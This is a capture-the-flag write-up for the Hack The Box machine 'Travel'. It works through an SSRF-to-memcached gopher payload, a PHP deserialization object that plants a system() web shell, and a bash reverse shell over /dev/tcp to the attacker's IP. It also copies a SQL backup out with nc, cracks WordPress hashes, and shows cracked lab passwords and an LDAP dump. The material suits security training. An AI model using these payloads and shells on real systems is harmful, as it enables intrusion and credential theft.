---
title: "Travel"
difficulty: Hard
os: Linux
points: 40
rating: 4.9
date: 2020-05-16
avatar: assets/htb/travel.png
htb_url: https://app.hackthebox.com/machines/Travel
---
## HTB - Travel

### Overview

### Useful Skills and Tools

**Useful thing 1**

* Browse and edit LDAP with Apache Directory Studio \(need link\)

**Useful thing 2**

* SSH port forwarding to connect to remote ports that are closed \(need sudo to use ports under 1024\)

### Enumeration

#### Nmap scan

I kicked off enumeration with an nmap scan against `<YOUR_IP>`. My go-to flags are: `-p-`, a shorthand that tells nmap to cover every port, `-sC` which is the same as `--script=default` and fires a set of nmap enumeration scripts at the host, `-sV` for service detection, `-oG <name>` to write the output to a file called `<name>`, `-n` to skip DNS resolution, and `-v` so I can watch results come in live instead of waiting for the final report.

```text
┌──(kac0㉿kali)-[~]
└─$ nmap -n -p- -sC -sV --reason -v <YOUR_IP> -oG travel
Starting Nmap 7.80 ( https://nmap.org ) at 2020-09-13 17:17 EDT

Nmap scan report for <YOUR_IP>
Host is up, received syn-ack (0.042s latency).

PORT    STATE SERVICE  REASON  VERSION
22/tcp  open  ssh      syn-ack OpenSSH 8.2p1 Ubuntu 4 (Ubuntu Linux; protocol 2.0)
80/tcp  open  http     syn-ack nginx 1.17.6
| http-methods: 
|_  Supported Methods: GET HEAD
|_http-server-header: nginx/1.17.6
|_http-title: Travel.HTB
443/tcp open  ssl/http syn-ack nginx 1.17.6
| http-methods: 
|_  Supported Methods: GET HEAD
|_http-server-header: nginx/1.17.6
|_http-title: Travel.HTB - SSL coming soon.
| ssl-cert: Subject: commonName=www.travel.htb/organizationName=Travel.HTB/countryName=UK
| Subject Alternative Name: DNS:www.travel.htb, DNS:blog.travel.htb, DNS:blog-dev.travel.htb
| Issuer: commonName=www.travel.htb/organizationName=Travel.HTB/countryName=UK
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2020-04-23T19:24:29
| Not valid after:  2030-04-21T19:24:29
| MD5:   ef0a a4c1 fbad 1ac4 d160 58e3 beac 9698
|_SHA-1: 0170 7c30 db3e 2a93 cda7 7bbe 8a8b 7777 5bcd 0498
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Nmap done: 1 IP address (1 host up) scanned in 15.35 seconds
```

nmap reported just three open ports on the box: 22 \(SSH\), 80 \(HTTP\), and 443 \(HTTPS\). The DNS NSE script output also revealed three virtual hosts tied to the IP:

```text
Subject Alternative Name: DNS:www.travel.htb, DNS:blog.travel.htb, DNS:blog-dev.travel.htb
```

I added all three to `/etc/hosts` so I could reach them.

Browsing to `www.travel.htb` gave me a "coming soon" landing page with a countdown. The page had a contact section that hinted at the likely user email format.

```text
CONTACT INFORMATION
hello@travel.htb Park Ave, 987, London, United Kingdom.
```

Port 443 just showed an under-construction page with nothing useful on it.

The Firefox extension `wappalyzer` reported the site was running WordPress 5.4. I launched `wpscan` to look for weaknesses with the command `wpscan --url http://blog.travel.htb/ --enumerate`.

```text
robots.txt found: http://blog.travel.htb/robots.txt
 | Interesting Entries:
 |  - /wp-admin/
 |  - /wp-admin/admin-ajax.php
[+] XML-RPC seems to be enabled: http://blog.travel.htb/xmlrpc.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%
 | References:
 |  - http://codex.wordpress.org/XML-RPC_Pingback_API
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner
 |  - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access

[+] WordPress readme found: http://blog.travel.htb/readme.html
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%

[i] User(s) Identified:

[+] admin
 | Found By: Author Posts
```

The scan turned up a WordPress login form at `http://blog.travel.htb/wp-login.php`, but nothing else of value.

I attempted a password reset since this WordPress version was said to leak information through that feature, but it went nowhere.

The `xmlrpc.php` endpoint also seemed to offer nothing at this point.

The `blog-dev` virtual host looked like a dead end too, so I started another Dirbuster scan hoping to find something reachable.

The `blog` site hosted an RSS feed built on the Awesome RSS WordPress plugin.

While reading the page source I spotted a `DEBUG` section that grabbed my attention. I wasn't sure what to do with it yet, but it looked promising.

There was also a mention of using "Additional CSS" pulled in from the `dev` site, which struck me as a possible way to move code between domains.

The raw XML powering the RSS page was another notable find. It hinted at a possible XML deserialization flaw in the site.

With nothing useful coming out of `wpscan`, I turned to my Dirbuster scan of the `dev-blog` site and combed through the interesting directories.

The Dirbuster run against `blog-dev` revealed what looked like an exposed git repo.

_The dirbuster scan also shows that some security has been put in place against automated scanners. I could see the repeated chain of /./ dirs that told me the scanner was stuck. After telling it to ignore those directories it found the `git` directory._

```text
┌──(kac0㉿kali)-[~/htb/travel]
└─$ python3 ~/.local/bin/git-dumper/git-dumper.py http://blog-dev.travel.htb/ gitdump
```

I created a directory called `gitdump` to hold the repo contents and ran `git-dumper` \(from [https://github.com/arthaud/git-dumper](https://github.com/arthaud/git-dumper)\) to pull down the repository.

```text
┌──(kac0㉿kali)-[~/htb/travel/gitdump]
└─$ ls -la          
total 24
drwxr-xr-x 3 kac0 kac0 4096 Sep 18 20:21 .
drwxr-xr-x 4 kac0 kac0 4096 Sep 18 20:17 ..
drwxr-xr-x 7 kac0 kac0 4096 Sep 18 20:21 .git
-rwxr-xr-x 1 kac0 kac0  540 Sep 18 20:21 README.md
-rwxr-xr-x 1 kac0 kac0 2970 Sep 18 20:21 rss_template.php
-rwxr-xr-x 1 kac0 kac0 1387 Sep 18 20:21 template.php

┌──(kac0㉿kali)-[~/htb/travel/gitdump]
└─$ ls -la .git
total 48
drwxr-xr-x 7 kac0 kac0 4096 Sep 18 20:21 .
drwxr-xr-x 3 kac0 kac0 4096 Sep 18 20:21 ..
-rw-r--r-- 1 kac0 kac0   13 Sep 18 20:21 COMMIT_EDITMSG
-rw-r--r-- 1 kac0 kac0   92 Sep 18 20:21 config
-rw-r--r-- 1 kac0 kac0   73 Sep 18 20:21 description
-rw-r--r-- 1 kac0 kac0   23 Sep 18 20:21 HEAD
drwxr-xr-x 2 kac0 kac0 4096 Sep 18 20:21 hooks
-rw-r--r-- 1 kac0 kac0  297 Sep 18 20:21 index
drwxr-xr-x 2 kac0 kac0 4096 Sep 18 20:21 info
drwxr-xr-x 3 kac0 kac0 4096 Sep 18 20:21 logs
drwxr-xr-x 7 kac0 kac0 4096 Sep 18 20:21 objects
drwxr-xr-x 3 kac0 kac0 4096 Sep 18 20:21 ref
```

The repo turned out to hold the source for the Awesome RSS app I'd come across earlier. The `README.md` laid out where the project currently stood.

```text
# Rss Template Extension

Allows rss-feeds to be shown on a custom wordpress page.

## Setup

* `git clone https://github.com/WordPress/WordPress.git`
* copy rss_template.php & template.php to `wp-content/themes/twentytwenty` 
* create logs directory in `wp-content/themes/twentytwenty` 
* create page in backend and choose rss_template.php as theme

## Changelog

- temporarily disabled cache compression
- added additional security checks 
- added caching
- added rss template

## ToDo

- finish logging implementation
```

![](assets/wu/travel/img-1.png)

The PHP file `rss_template.php` parses URLs, builds SimplePie objects from them, and points each object's cache at a local memcache. SimplePie is a WordPress plugin that enables RSS feeds on PHP-based sites. . Feeds are fetched from the `custom_feed_url` parameter when present; otherwise it falls back to `http://www.travel.htb/newsfeed/customfeed.xml`, which I'd already located via dirbuster.

[Memcached](https://memcached.org/) caches requests in memory as key-value pairs so they can be served quickly without repeated requests. Here the memcache keys get a `xct_` prefix when stored.

![](assets/wu/travel/img-2.png)

The file `template.php` showed more signs of site hardening. They appeared to be building a crude web application firewall that strips out any request containing `file://`, `@`, `-o`, `-F`, or attempts to reach localhost. Even with that URL filtering, plenty of bypasses remain. For instance, `ftp://` or `gopher://` work instead of `file://`, and localhost can be referenced using alternate encodings. As an example, 127.0.0.1 is `0x7F000001` in hex and `2130706433` in decimal. Most URL parsers will translate addresses automatically regardless of the numeric base used.

The TemplateHelper class relies on `file_put_contents()` to write data to a file under `/logs/`. That gets called from `__construct()` and `__wakeup()` by way of `init()`. The latter two are PHP "agic methods](https://www.php.net/manual/en/language.oop5.magic.php)" that fire automatically on certain events. For example, `__wakeup()` runs when an object is deserialized. Because these are public functions, other PHP files that include this one can call them, as `rss_template.php` does.

![](assets/wu/travel/img-3.png)

`rss_template.php` also pulls in a `debug.php` whenever the `debug` parameter is set. This matched what I'd seen in the source of the `/awesome-rss` site. After catching this in the code, I returned to that page to see whether I could trigger it. Setting the debug flag by visiting `http://blog.travel.htb/awesome-rss?debug` produced different page source than before.

![](assets/wu/travel/img-4.png)

The `debug` parameter dropped some deserialized PHP into the middle of the page, but nothing jumped out as immediately exploitable. I did notice the key part of the output carried the `_xct` prefix mentioned in the PHP code.

The `url_get_contents()` function in `rss_template.php` lets you supply an arbitrary URL through the `custom_feed_url` attribute, so I stood up a python SimpleHTTPServer and loaded my test page through this link: [http://blog.travel.htb/awesome-rss/?custom\_feed\_url=http://10.10.15.53:8090/test.html](http://blog.travel.htb/awesome-rss/?custom_feed_url=http://10.10.15.53:8090/test.html)

![](assets/wu/travel/img-5.png)

```text
┌──(kac0㉿kali)-[~/htb/travel]
└─$ python -m SimpleHTTPServer 8090
Serving HTTP on 0.0.0.0 port 8090 ...
<YOUR_IP> - - [18/Sep/2020 20:59:47] "GET / HTTP/1.1" 200 -
<YOUR_IP> - - [18/Sep/2020 20:59:47] "GET / HTTP/1.1" 200 -
<YOUR_IP> - - [18/Sep/2020 20:59:47] "GET /10-awesome-rss.png HTTP/1.1" 200 -
<YOUR_IP> - - [18/Sep/2020 20:59:47] "GET /11-feed-xml.png HTTP/1.1" 200 -
<YOUR_IP> - - [18/Sep/2020 20:59:48] "GET /8-xmlrpc.png HTTP/1.1" 200 -
<YOUR_IP> - - [18/Sep/2020 21:04:23] "GET /test.html HTTP/1.1" 200 -
<YOUR_IP> - - [18/Sep/2020 21:04:23] "GET /test.html HTTP/1.1" 200 -
```

The test didn't render anything on the page, but I saw the server reach back to me and grab the directory contents, automatically pulling several .png files \(and oddly even a .netxml file I'd left there from messing with airodump-ng earlier that day.\)

That confirmed the SSRF flaw the rudimentary PHP WAF was meant to stop, though I still had to work out how to get code execution. Planting it in the memcached key being loaded by `debug.php` looked like the most likely path. Since the usual ways of referencing file includes in a URL were blocked, I needed a less common technique. Searching for SSRF file inclusion bypasses led me to [https://www.blackhat.com/docs/us-17/thursday/us-17-Tsai-A-New-Era-Of-SSRF-Exploiting-URL-Parser-In-Trending-Programming-Languages.pdf](https://www.blackhat.com/docs/us-17/thursday/us-17-Tsai-A-New-Era-Of-SSRF-Exploiting-URL-Parser-In-Trending-Programming-Languages.pdf).

![](assets/wu/travel/img-6.png)

This Black Hat talk included a case study where the researcher leveraged SSRF to attack Memcached. It looked like precisely what I needed.

![](assets/wu/travel/img-7.png)

From `rss_template.php` I picked up the connection syntax, including the address `127.0.0.1:11211`. Since the included data has to originate on the local box, I needed a way to embed it without fetching files from my own machine. After a bit of research I opted to try the [gopher protocol](https://en.wikipedia.org/wiki/Gopher_%28protocol%29). Gopher is an older protocol for accessing networked resources that most browsers and tools like cURL still support. It was originally defined in [RFC 1436](https://tools.ietf.org/html/rfc1436). IANA gave it TCP port 70, though that's hardly ever used.

 I fired a request from the browser to test this with my crafted URL, substituting the hex-encoded IP `0x7F000001` for `127.0.0.1`.

```text
http://blog.travel.htb/awesome-rss/?custom_feed_url=gopher://0x7F000001:11211/_%0d%0aset%20TEST%204%200%204%0d%0atest%0d%0a
```

That set a key called `TEST` in memcached holding the value `test`. Hitting the URL above and then re-requesting with `?debug` returns:

```markup
<!--
DEBUG
 ~~~~~~~~~~~~~~~~~~~~~ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ 
| TEST | test |
| xct_4e5612ba07(...) | a:4:{s:5:"child";a:1:{s:0:"";a:1:{(...) |
 ~~~~~~~~~~~~~~~~~~~~~ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ 
-->
```

My test key was cached as expected. The next step was to see whether I could weaponize this against the site. Because memcached keeps PHP objects in serialized form, it can be abused by injecting a malicious object and triggering it on deserialization through the `__wakeup()` method I'd seen. The git-dumped code had no obvious direct deserialization routines, so I reviewed the SimplePie plugin source on GitHub for hints.

### SimplePie code review

Beware, the following section is a labyrinthine mess of tracing function calls across multiple libraries and classes.  I'll try to explain as best I can, but if you would rather skip this section click [here](travel-write-up.md#crafting-the-payload).

![](assets/wu/travel/img-8.png)

[https://github.com/WordPress/WordPress/blob/master/wp-includes/SimplePie/Cache/Memcached.php](https://github.com/WordPress/WordPress/blob/master/wp-includes/SimplePie/Cache/Memcached.php)

It didn't take much digging to land on the relevant code.  The `__construct` function of the `SimplePie_Cache_Memcached` class is the one called by the site's `get_feed()` function.  They'd kept the default host and port but changed the `timeout` and `prefix` values.  This clarified what actually lands in the memcached key. 

![](assets/wu/travel/img-9.png)

I also looked into `Misc.php` and `Cache.php` since `Memcache.php` references them. `Cache.php` defines a `get_handler` function that returns an object depending on the requested handler type. `SimplePie_Cache_Memcached` is one of those handlers. In it `$name` is set to `$filename` and `$type` to `$extension`.

Going back over the `Memcached.php` source, I traced the flow. The function takes the MD5 hash of `$name` \(filename\) and `$type` \(extension\) together. The prefix \(here `_xct`\) is then prepended. 

![](assets/wu/travel/img-10.png)

It took me a while to track down how this method is actually used, but I eventually found it in Class-SimplePie.php. 

```php
$cache = $this->registry->call('Cache', 'get_handler', array($this- cache_location, call_user_func($this->cache_name_function, $url), 'spc')); 
```

This calls `get_handler()` from `Cache.php` with `cache_location`, `cache_name_function($url)`, and a filetype of `spc`. 

![](assets/wu/travel/img-11.png)

Searching the SimplePie class for `$cache_name_function`, I found a short function that sets it to `md5`.  

_**The end result of all of this:**_ It means `$filename` \(later `$name`\) is the MD5 of the URL `md5($url)`, while `$extension` \(later `$type`\) is `spc`. Those are concatenated, the MD5 is taken, and `_xct` is prepended. That's everything I need to build the memcached key that holds my malicious payload.  the `__construct` method above provides the template. As pseudo-code: `key_name = _xct + md5sum( md5sum(url) + ':spc' )`. I confirmed it using the original URL of the page I'd run debug against.

_It took me a few tries to get the right URL.  First I tried just the part after **`/newsfeed/`**, then I forgot to add the **`http://`**.  The final working URL that matched the result I was looking for was **`http://www.travel.htb/newsfeed/customfeed.xml`**._

### Crafting the payload

```text
┌──(kac0㉿kali)-[~/htb/travel]
└─$ echo -n 'http://www.travel.htb/newsfeed/customfeed.xml' | md5sum
3903a76d1e6fef0d76e973a0561cbfc0  -

┌──(kac0㉿kali)-[~/htb/travel]
└─$ echo -n '3903a76d1e6fef0d76e973a0561cbfc0:spc' | md5sum  
4e5612ba079c530a6b1f148c0b352241  -
```

The start of this resulting hash lines up with the debug output the `customfeed.xml` page gave me earlier! 

> In the Memcached.php class, I  also see a load\(\) method that calls unserialize\(\).
>
>  Using this I can create a malicious object that will save a PHP file to the logs folder when it's deserialized. The TemplateHelper class comes in handy here. I mirrored this from the one in the earlier code.  Note: the $file and $data variables must be made public as private variables can't be accessed directly from outside the class.

```php
<?php
class TemplateHelper {

    public $file;
    public $data;
    
    public function __construct(string $file, string $data) {
        $this->init($file, $data);
    }
    public function __wakeup() {
        $this->init($this->file, $this->data);
    }
    private function init(string $file, string $data) {
        $this->file = $file;
        $this->data = $data;
        file_put_contents(__DIR__.'/logs/'.$this->file, $this->data);
    }
}

$back_door = new TemplateHelper("back_door.php", "<?php system(\$_REQUEST[test]); ?>");

echo serialize($back_door);

?>
```

This PHP script [serializes](https://www.w3schools.com/PHP/func_var_serialize.asp) a `TemplateHelper` instance that, once deserialized, drops my backdoor into a file named `back_door.php` inside the `/jobs/` folder.

> Next, we need to set this payload as a value for the key `xct_4e5612ba079c530a6b1f148c0b352241` so that it is deserialized when the debug method is called.

```php
┌──(kac0㉿kali)-[~/htb/travel]
└─$ php -f test.php
                                                                                 1 ⨯
PHP Warning:  file_put_contents(/home/kac0/htb/travel/logs/back_door.php): failed to open stream: No such file or directory in /home/kac0/htb/travel/test.php on line 14
O:14:"TemplateHelper":2:{s:4:"file";s:13:"back_door.php";s:4:"data";s:34:"<?php system($_REQUEST['test']);?>";}                                                                                                        

┌──(kac0㉿kali)-[~/htb/travel]
└─$ Gopherus/gopherus.py --exploit phpmemcache

  ________              .__                                                                             
 /  _____/  ____ ______ |  |__   ___________ __ __  ______                                              
/   \  ___ /  _ \\____ \|  |  \_/ __ \_  __ \  |  \/  ___/                                              
\    \_\  (  <_> )  |_> >   Y  \  ___/|  | \/  |  /\___ \                                               
 \______  /\____/|   __/|___|  /\___  >__|  |____//____  >                                              
        \/       |__|        \/     \/                 \/                                               

                author: $_SpyD3r_$                                                                      

This is usable when you know Class and Variable name used by user

Give serialization payload
example: O:5:"Hello":0:{}   : O:14:"TemplateHelper":2:{s:4:"file";s:13:"test.php";s:4:"data";s:34:"<?php system($_REQUEST['test']);?>";}

Your gopher link is ready to do SSRF :                                                                   
gopher://127.0.0.1:11211/_%0d%0aset%20SpyD3r%204%200%20111%0d%0aO:14:%22TemplateHelper%22:2:%7Bs:4:%22file%22%3Bs:13:%22test.php%22%3Bs:4:%22data%22%3Bs:34:%22%3C%3Fphp%20system%28%24_REQUEST%5B%27test%27%5D%29%3B%3F%3E%22%3B%7D%0d%0a

After everything done, you can delete memcached item by using this payload:                             

gopher://127.0.0.1:11211/_%0d%0adelete%20SpyD3r%0d%0a

-----------Made-by-SpyD3r-----------
```

fixing and uploading final URL - [https://github.com/tarunkant/Gopherus](https://github.com/tarunkant/Gopherus)

final url - the length of the contents is important! make sure it is correct \(111 in my case\)

HAVE TO decimal/hex encode 127.0.0.1~~~!!! 2130706433 or 0x7f000001 and add xct\_ 

```text
http://blog.travel.htb/awesome-rss/?custom_feed_url=gopher://0x7f000001:11211/_%0d%0aset%20xct_4e5612ba079c530a6b1f148c0b352241%204%200%20111%0d%0aO:14:%22TemplateHelper%22:2:%7Bs:4:%22file%22%3Bs:13:%22back_door.php%22%3Bs:4:%22data%22%3Bs:34:%22%3C%3Fphp%20system%28%24_REQUEST%5B%27test%27%5D%29%3B%3F%3E%22%3B%7D%0d%0a
```

After that I had to work out where my `back_door.php` had landed. A clue came from the README.md I'd pulled from the git repo earlier: `* create logs directory in wp-content/themes/twentytwenty`, and the TemplateHelper class confirmed it goes in the `/logs/` folder. 

 If you look closely at the output from when I ran my PHP code above, it tried to drop the file in **`/home/kac0/htb/travel/logs/`**, which didn't exist, hence the error.

a shell can be obtained by using parameter on the backdoor:

```text
http://blog.travel.htb/wp-content/themes/twentytwenty/logs/back_door.php?test=bash -c "bash -i >& /dev/tcp/10.10.15.53/8099 0>&1"
```

`xct_4e5612ba079c530a6b1f148c0b352241`

### Initial Foothold - `www-data`

```text
www-data@blog:/var/www/html$ ls -la
ls -la
total 232
drwxrwxrwx  5 www-data www-data  4096 Apr 13 13:28 .
drwxr-xr-x  1 root     root      4096 Mar 31 18:10 ..
-rw-r--r--  1 www-data www-data   461 Apr 13 13:19 .htaccess
-rw-r--r--  1 root     root      6423 Apr 13 14:21 customfeed.xml
-rw-r--r--  1 www-data www-data   405 Feb  6  2020 index.php
-rw-r--r--  1 www-data www-data 19915 Feb 12  2020 license.txt
-rw-r--r--  1 www-data www-data  7278 Jan 10  2020 readme.html
-rw-r--r--  1 www-data www-data  6912 Feb  6  2020 wp-activate.php
drwxr-xr-x  9 www-data www-data  4096 Mar 31 20:03 wp-admin
-rw-r--r--  1 www-data www-data   351 Feb  6  2020 wp-blog-header.php
-rw-r--r--  1 www-data www-data  2275 Feb  6  2020 wp-comments-post.php
-rw-r--r--  1 www-data www-data  2913 Feb  6  2020 wp-config-sample.php
-rw-rw-rw-  1 www-data www-data  3186 Apr 13 14:10 wp-config.php
drwxr-xr-x  5 www-data www-data  4096 Apr 23 19:10 wp-content
-rw-r--r--  1 www-data www-data  3940 Feb  6  2020 wp-cron.php
drwxr-xr-x 21 www-data www-data 12288 Mar 31 20:03 wp-includes
-rw-r--r--  1 www-data www-data  2496 Feb  6  2020 wp-links-opml.php
-rw-r--r--  1 www-data www-data  3300 Feb  6  2020 wp-load.php
-rw-r--r--  1 www-data www-data 47874 Feb 10  2020 wp-login.php
-rw-r--r--  1 www-data www-data  8501 Feb  6  2020 wp-mail.php
-rw-r--r--  1 www-data www-data 19396 Feb 10  2020 wp-settings.php
-rw-r--r--  1 www-data www-data 31111 Feb  6  2020 wp-signup.php
-rw-r--r--  1 www-data www-data  4755 Feb  6  2020 wp-trackback.php
-rw-r--r--  1 www-data www-data  3133 Feb  6  2020 xmlrpc.php
```

Nothing of interest in the `/var/www/html` directory

```text
www-data@blog:/opt/wordpress$ ls -la
ls -la
total 1180
drwxr-xr-x 1 root root    4096 Apr 24 06:39 .
drwxr-xr-x 1 root root    4096 Apr 13 13:37 ..
-rw-r--r-- 1 root root 1190388 Apr 24 06:39 backup-13-04-2020.sql
www-data@blog:/opt/wordpress$ nc 10.10.15.53 9099 < backup-13-04-2020.sql
nc 10.10.15.53 9099 < backup-13-04-2020.sql
```

Inside `/opt/wordpress` I found a .sql file, which I exfiltrated to my own box; I tried opening it in `sqlitebrowser` but was told it wasn't a valid database. Running the file command on it reported a standard ASCII file, so I opened it in `vim` and started reading through it

picture

### Finding user credentials

It was a sqldump output rather than a real database, holding all the recent queries against the DB. I located password hashes for an `admin` user and `lynik-admin`, ran hash-identifier to determine the hash type, then loaded them into hashcat for cracking

```text
INSERT INTO `wp_users` VALUES
(1,'admin','$P$BIRXVj/ZG0YRiBH8gnRy0chBx67WuK/','admin','admin@travel.htb','http
://localhost','2020-04-13 13:19:01','',0,'admin'),(2,'lynik-
admin','$P$B/wzJzd3pj/n7oTe2GGpi5HcIl4ppc.','lynik-
admin','lynik@travel.htb','','2020-04-13 13:36:18','',0,'Lynik Schmidt');
```

```text
┌──(kac0㉿kali)-[~/htb/travel]
└─$ hash-identifier 
   #########################################################################
   #     __  __                     __           ______    _____           #
   #    /\ \/\ \                   /\ \         /\__  _\  /\  _ `\         #
   #    \ \ \_\ \     __      ____ \ \ \___     \/_/\ \/  \ \ \/\ \        #
   #     \ \  _  \  /'__`\   / ,__\ \ \  _ `\      \ \ \   \ \ \ \ \       #
   #      \ \ \ \ \/\ \_\ \_/\__, `\ \ \ \ \ \      \_\ \__ \ \ \_\ \      #
   #       \ \_\ \_\ \___ \_\/\____/  \ \_\ \_\     /\_____\ \ \____/      #
   #        \/_/\/_/\/__/\/_/\/___/    \/_/\/_/     \/_____/  \/___/  v1.2 #
   #                                                             By Zion3R #
   #                                                    www.Blackploit.com #
   #                                                   Root@Blackploit.com #
   #########################################################################
--------------------------------------------------
 HASH: $P$B/wzJzd3pj/n7oTe2GGpi5HcIl4ppc.

Possible Hashs:
[+] MD5(Wordpress)
--------------------------------------------------
```

[https://scottlinux.com/2013/04/23/crack-wordpress-password-hashes-with-hashcat-how-to/](https://scottlinux.com/2013/04/23/crack-wordpress-password-hashes-with-hashcat-how-to/) tells me the correct hash type to use for hashcat is m=400

```text
┌──(kac0㉿kali)-[~/htb/travel]
└─$ hashcat -O -D1,2 -a0 -m400 travel-hashes /usr/share/wordlists/rockyou.txt                     130 ⨯
hashcat (v6.1.1) starting...

Dictionary cache hit:
* Filename..: /usr/share/wordlists/rockyou.txt
* Passwords.: 14344385
* Bytes.....: 139921507
* Keyspace..: 14344385

$P$B/wzJzd3pj/n7oTe2GGpi5HcIl4ppc.:1stepcloser   
Approaching final keyspace - workload adjusted.  

Session..........: hashcat
Status...........: Exhausted
Hash.Name........: phpass
Hash.Target......: travel-hashes
Time.Started.....: Sat Sep 19 14:31:18 2020 (6 mins, 22 secs)
Time.Estimated...: Sat Sep 19 14:37:40 2020 (0 secs)
Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........:    39458 H/s (13.43ms) @ Accel:1024 Loops:1024 Thr:1 Vec:8
Recovered........: 1/2 (50.00%) Digests, 1/2 (50.00%) Salts
Progress.........: 28688770/28688770 (100.00%)
Rejected.........: 2120/28688770 (0.01%)
Restore.Point....: 14344385/14344385 (100.00%)
Restore.Sub.#1...: Salt:1 Amplifier:0-1 Iteration:7168-8192
Candidates.#1....: $HEX[21494d41424954434821] -> $HEX[042a0337c2a156616d6f732103]

Started: Sat Sep 19 14:31:07 2020
Stopped: Sat Sep 19 14:37:41 2020
```

I only managed to crack one of the two hashes. The `lynik-admin` password came back as `1stepcloser`, which I then used to SSH into the box.

### Road to User

```text
┌──(kac0㉿kali)-[~/htb/travel]
└─$ ssh lynik-admin@<YOUR_IP>                                                                  255 ⨯
lynik-admin@<YOUR_IP>'s password: 
Permission denied, please try again.
lynik-admin@<YOUR_IP>'s password: 
Welcome to Ubuntu 20.04 LTS (GNU/Linux 5.4.0-26-generic x86_64)

  System information as of Sat 19 Sep 2020 03:12:57 PM UTC

  System load:                      0.0
  Usage of /:                       46.0% of 15.68GB
  Memory usage:                     11%
  Swap usage:                       0%
  Processes:                        201
  Users logged in:                  0
  IPv4 address for br-836575a2ebbb: 172.20.0.1
  IPv4 address for br-8ec6dcae5ba1: 172.30.0.1
  IPv4 address for docker0:         172.17.0.1
  IPv4 address for eth0:            <YOUR_IP>

lynik-admin@travel:~$ id && hostname
uid=1001(lynik-admin) gid=1001(lynik-admin) groups=1001(lynik-admin)
travel
lynik-admin@travel:~$
```

```text
lynik-admin@travel:~$ sudo -l
[sudo] password for lynik-admin: 
Sorry, user lynik-admin may not run sudo on travel.
```

I checked what `lynik-admin` could do via sudo, but the user clearly wasn't listed in the sudoers file

### User.txt

```text
lynik-admin@travel:~$ ls
user.txt
lynik-admin@travel:~$ cat user.txt 
c568************************7230
```

## Path to Power \(Gaining Root Access\)

### Enumeration as `lynik-admin`

```text
lynik-admin@travel:~$ ls -la
total 36
drwx------ 3 lynik-admin lynik-admin 4096 Apr 24 06:52 .
drwxr-xr-x 4 root        root        4096 Apr 23 17:31 ..
lrwxrwxrwx 1 lynik-admin lynik-admin    9 Apr 23 17:31 .bash_history -> /dev/null
-rw-r--r-- 1 lynik-admin lynik-admin  220 Feb 25  2020 .bash_logout
-rw-r--r-- 1 lynik-admin lynik-admin 3771 Feb 25  2020 .bashrc
drwx------ 2 lynik-admin lynik-admin 4096 Apr 23 19:34 .cache
-rw-r--r-- 1 lynik-admin lynik-admin   82 Apr 23 19:35 .ldaprc
-rw-r--r-- 1 lynik-admin lynik-admin  807 Feb 25  2020 .profile
-r--r--r-- 1 root        root          33 Sep 19 14:16 user.txt
-rw------- 1 lynik-admin lynik-admin  861 Apr 23 19:35 .viminfo
```

In `lynik-admin`'s home directory there was an interesting `.ldaprc` file. Per the anpage ](http://manpages.ubuntu.com/manpages/cosmic/man5/ldap.conf.5.html)this file holds the configuration variables for connecting to LDAP.

```text
ldap.travel.htb
BASE dc=travel,dc=htb
BINDDN cn=lynik-admin,dc=travel,dc=htb
```

![](assets/wu/travel/img-12.png)

this file is used to store Vim history data. You can find recent files, deleted data, and search history here.There is a line which was deleted from the .ldaprc file. bind password = `Theroadlesstraveled` . Let's try using it to connect to LDAP.

To do this remotely I would use the command: 

```text
ldapsearch -x -h 127.0.0.1 -b "DC=travel,DC=htb" -D "CN=lynik-admin,DC=travel,DC=htb" -w Theroadlesstraveled 
```

 `-h` sets the host to connect to and `-x` selects simple anonymous authentication. `-b` sets the search base and `-D` gives the bind Domain Name, both of which come from the `.ldaprc` file above. `-w` supplies the bind password.

But...since I am logged in why do it the hard way?

```text
lynik-admin@travel:~$ ldapsearch -x -w Theroadlesstraveled
# extended LDIF
#
# LDAPv3
# base <dc=travel,dc=htb> (default) with scope subtree
# filter: (objectclass=*)
# requesting: ALL
#

# travel.htb
dn: dc=travel,dc=htb
objectClass: top
objectClass: dcObject
objectClass: organization
o: Travel.HTB
dc: travel

# admin, travel.htb
dn: cn=admin,dc=travel,dc=htb
objectClass: simpleSecurityObject
objectClass: organizationalRole
cn: admin
description: LDAP administrator

# servers, travel.htb
dn: ou=servers,dc=travel,dc=htb
description: Servers
objectClass: organizationalUnit
ou: servers

# lynik-admin, travel.htb
dn: cn=lynik-admin,dc=travel,dc=htb
description: LDAP administrator
objectClass: simpleSecurityObject
objectClass: organizationalRole
cn: lynik-admin
userPassword:: e1NTSEF9MEpaelF3blZJNEZrcXRUa3pRWUxVY3ZkN1NwRjFRYkRjVFJta3c9PQ=
 =

...Snipped for brevity...

# jane, users, linux, servers, travel.htb
dn: uid=jane,ou=users,ou=linux,ou=servers,dc=travel,dc=htb
uid: jane
uidNumber: 5005
homeDirectory: /home/jane
givenName: Jane
gidNumber: 5000
sn: Rodriguez
cn: Jane Rodriguez
objectClass: top
objectClass: person
objectClass: organizationalPerson
objectClass: inetOrgPerson
objectClass: posixAccount
objectClass: shadowAccount
loginShell: /bin/bash

# brian, users, linux, servers, travel.htb
dn: uid=brian,ou=users,ou=linux,ou=servers,dc=travel,dc=htb
uid: brian
cn: Brian Bell
sn: Bell
givenName: Brian
loginShell: /bin/bash
uidNumber: 5002
gidNumber: 5000
homeDirectory: /home/brian
objectClass: top
objectClass: person
objectClass: organizationalPerson
objectClass: inetOrgPerson
objectClass: posixAccount
objectClass: shadowAccount

# frank, users, linux, servers, travel.htb
dn: uid=frank,ou=users,ou=linux,ou=servers,dc=travel,dc=htb
uid: frank
cn: Frank Stewart
sn: Stewart
givenName: Frank
loginShell: /bin/bash
uidNumber: 5001
gidNumber: 5000
homeDirectory: /home/frank
objectClass: top
objectClass: person
objectClass: organizationalPerson
objectClass: inetOrgPerson
objectClass: posixAccount
objectClass: shadowAccount

